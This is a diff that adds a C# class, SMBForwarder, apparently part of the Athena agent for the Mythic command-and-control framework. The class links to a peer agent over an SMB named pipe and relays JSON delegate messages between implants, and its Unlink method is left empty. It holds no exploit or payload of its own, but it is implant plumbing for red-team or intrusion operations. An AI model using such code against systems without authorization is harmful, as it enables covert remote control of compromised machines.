@@ -1,0 +1,78 @@
+﻿using Athena.Models.Athena.Pipes;
+using Athena.Models.Mythic.Response;
+using Athena.Utilities;
+using Newtonsoft.Json;
+using System.Collections.Concurrent;
+using System.Collections.Generic;
+using System.Threading.Tasks;
+
+namespace Athena.Config
+{
+    public class SMBForwarder
+    {
+        public bool connected { get; set; }
+        public List<DelegateMessage> messageOut { get; set; }
+        public ConcurrentQueue<string> queueIn { get; set; }
+        private ClientPipe clientPipe { get; set; }
+
+        public SMBForwarder()
+        {
+            this.messageOut = new List<DelegateMessage>();
+            this.queueIn = new ConcurrentQueue<string>();
+        }
+ 
+        //Link to the Athena SMB Agent
+        public bool Link(string host, string pipename)
+        {
+            try
+            {
+                if (this.clientPipe == null || !this.connected)
+                {
+                    this.clientPipe = new ClientPipe(host, pipename, p => p.StartStringReaderAsync());
+
+                    this.clientPipe.DataReceived += (sndr, args) =>
+                      Task.Run(() => {
+                          Misc.WriteDebug("Message Received");
+                          Misc.WriteDebug(args.String);
+                          this.messageOut.Add(JsonConvert.DeserializeObject<DelegateMessage>(args.String));
+                      });
+
+                    this.clientPipe.PipeClosed += (sndr, args) =>
+                    Task.Run(() =>
+                    {
+                        this.connected = false;
+                    });
+
+                    clientPipe.Connect();
+                    return true;
+                }
+                else
+                {
+                    return false;
+                }
+            }
+            catch
+            {
+                return false;
+            }
+        }
+        public bool ForwardDelegateMessage(DelegateMessage dm)
+        {
+            try
+            {
+                this.clientPipe.WriteString(JsonConvert.SerializeObject(dm));
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+        
+        //Unlink from the named pipe
+        public void Unlink()
+        {
+
+        }
+    }
+}
